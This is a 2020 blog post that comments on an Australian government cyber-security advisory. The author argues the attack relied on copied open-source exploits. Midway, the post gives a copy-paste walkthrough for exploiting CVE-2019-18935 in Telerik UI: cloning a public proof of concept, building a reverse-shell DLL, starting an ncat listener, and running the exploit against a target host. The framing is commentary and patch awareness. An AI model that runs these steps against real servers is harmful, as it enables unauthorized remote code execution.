---
title: Copy-Paste Compromises
category: infosec
date: 2020-06-19
thumbnail: copypaste-compromises-thumb.png
tags: aussec
description:
---

Today I woke up to an organisation-wide email telling me that "Australia is currently being hit by a cyber-attack which is targeting all levels of government, political parties and private businesses". Hey that sounds fun, so I look at the news and see this headline: "[Cyber-attack Australia: sophisticated attacks from ‘state-based actor’, PM says](https://www.theguardian.com/australia-news/2020/jun/19/australia-cyber-attack-attacks-hack-state-based-actor-says-australian-prime-minister-scott-morrison)."

Ok so the government said it. Now as weird as it may seem, this is the first thing I thought when I read that: "Oh so it's probably bullshit then". Our government (but mostly a certain party) has a bad track record of calling things cyber attacks. Back in 2016 they blamed a DDoS attack on taking down the ABS Census website[^1], when in reality people where just, you know... **using it**. 

Apparently we invest absolutely noting in our technology infrastructure, because these absolute mad lads went and blamed another failure on a DDoS attack earlier this year. This time it was people trying to register for Centrelink[^2], which is a little worse then people unable to fill out census forms as instead it affects people who have lost their jobs due to a certain global pandemic and need support.

And while not directly related to cyber security, let me remind you about the NBN. What a bloody farce. Any time the Coalition starts talking about techonology (or anything, really), my brain immediately starts shutting down in fear of getting an aneurysm.

But back to the topic on-hand, unfortunately, or fortunately for me because I seem to enjoy reading postmortems, this time it's actually a cyber attack. According to the previous article: "we know it is a sophisticated state-based cyber actor because of the scale and nature of the targeting and the tradecraft used." 

I won't comment about the "state-based cyber actor", because even though they won't say who it is, it's pretty obvious. So we will take that part out and instead look at how it was "sophisticated [...] because of the scale and nature of the targeting and the tradecraft used." Sophisticated huh? That's interesting. 

The Australian Cyber Security Centre’s (ACSC) published an advisory that details the tactics, techniques and procedures (TTPs) identified during the investigation of this attack. You can read the summary [here](https://www.cyber.gov.au/threats/advisory-2020-008-copy-paste-compromises-tactics-techniques-and-procedures-used-target-multiple-australian-networks). But I'm going to look more at the [PDF](https://www.cyber.gov.au/sites/default/files/2020-06/ACSC-Advisory-2020-008-Copy-Paste-Compromises.pdf) that goes into more detail.

Immediately we read that "the title ‘Copy-Paste Compromises’ is derived from the actor’s heavy use of proof of concept exploit code, web shells and other tools copied almost identically from open source."

Oh no, I'm already spotting a few red flags with this. Let's read that again with a focus on the important parts.

> Heavy use of proof of concept exploit code [...] copied almost identically from open source.

Now look, I didn't expect it to be Stuxnet 2: Electric Boogaloo and have a million zero days, but these are not the words we should be reading when we are looking for a "sophisticated" cyber attack. And it's a little concering that the Australian government (and some businesses, but I expect them to have crap security anyway) are not able to defend against well known, open source vulnerabilities enacted by what seems to be a bunch of script kiddies.

But to be fair, it looks like most of the initial access actually comes from spearphishing people, which is a hard thing to defend against. It's more about education and telling people to stop being stupid than it is about securing your infrastructure. However, I consider social engineering to be cheating because I have social anxiety and am unable to do it, so I'm going to ignore it.

Instead let's look at "exploitation of public facing infrastructure—primarily through the use of remote code execution vulnerability in unpatched versions of Telerik UI." They cite CVE-2019-18935: "Telerik UI - Remote Code Execution via Insecure Deserialization" as one of the most common exploits used. 

Telerik UI for ASP.NET AJAX is a widely used suite of UI components for web applications. It seems `RadAsyncUpload`, a file handler in Telerik UI for ASP.NET AJAX that enables uploading files asynchronously, insecurely deserializes JSON objects in a manner that results in arbitrary remote code execution on the software's underlying host.[^3]

The basic idea of the exploit is that you upload a "mixed mode assembly" DLL using Telerkit UI and specifying it as a "gaget", which is "a class within the executing scope of the application that, as a side effect of being instantiated and modified via setters or field assignment, has special properties that make it useful during deserialization." 

Yeah I don't really know what any of that is either. Anyway, then some funky stuff happens when it attemps to deserialise it and bing bong, you got yourself remote code execution. This is a pretty common way of RCE and probably should have been found eariler, so RadAsyncUpload seems more like **Bad**AsyncUpload to me! Hah!

...

Ok moving on.

In case you are not aware of how easy it is to use exploits like these and because I want to pad this post out, let's take a look at the steps you need to do the exploit:

1. Download the repo: 
```
git clone https://github.com/noperator/CVE-2019-18935.git && cd CVE-2019-18935
```

2. Install the Python environment.
```
python3 -m venv env
source env/bin/activate
pip3 install -r requirements.txt
```

3. Build the reverse shell that they provide for you (need Visual Studio installed).
```
sed -i .bu 's/<HOST>/<HOST>/; s/<PORT>/<PORT>/' rev_shell.c
build_dll.bat rev_shell.c
```

4.  Setup Netcat for callback.
```
sudo ncat -lvp <PORT>
```

4. Run the thing.
```
python3 CVE-2019-18935.py -u <HOST>/Telerik.Web.UI.WebResource.axd?type=rau -v <VERSION> -f 'C:\Windows\Temp' -p sleep_2019121205271355_x86.dll
```

You can practically copy and paste all of this as there were only three things you needed to change:

* The `<HOST>` param: Obviously you need to specify what host your attacking.
* The `<PORT>` param: The port you'll be listening on for the reverse shell.
* The `<VERSION>` param: This is the version of Telerik UI that is being used as newer version have been patched. You can normally find what version it is by checking the HTML, otherwise you can brute-force it.

Most of the time, you'd make your own reverse shell and tailor it for your victim (if you're any good, I never do it because I'm lazy and stupid). But the report says that "most common payloads used by the actor were copies of public proof of concept exploit code for a sleep test and reverse shell binary" which are exactly the ones we just looked at (step 3). 

There's way more in the other sections like Privilege Escalation, Credential Access, etc. But I just wanted a quick look at how "sophisticated" the attack was. And it turns out to be pretty average if I'm to be honest.

This is why I don't do infosec content anymore, it's pretty boring just running the exploits and instead all the fun comes from making/finding them. But I can't do that stuff cus I'm dumb.

Moral of the story: patch your systems and stay in school.

----

[^1]: https://theconversation.com/did-the-census-really-suffer-a-denial-of-service-attack-63755

[^2]: https://www.theguardian.com/australia-news/2020/mar/23/incompetence-attack-mygov-website-did-not-crash-because-of-ddos-cyber-assault-as-stuart-robert-claimed

[^3]: https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui
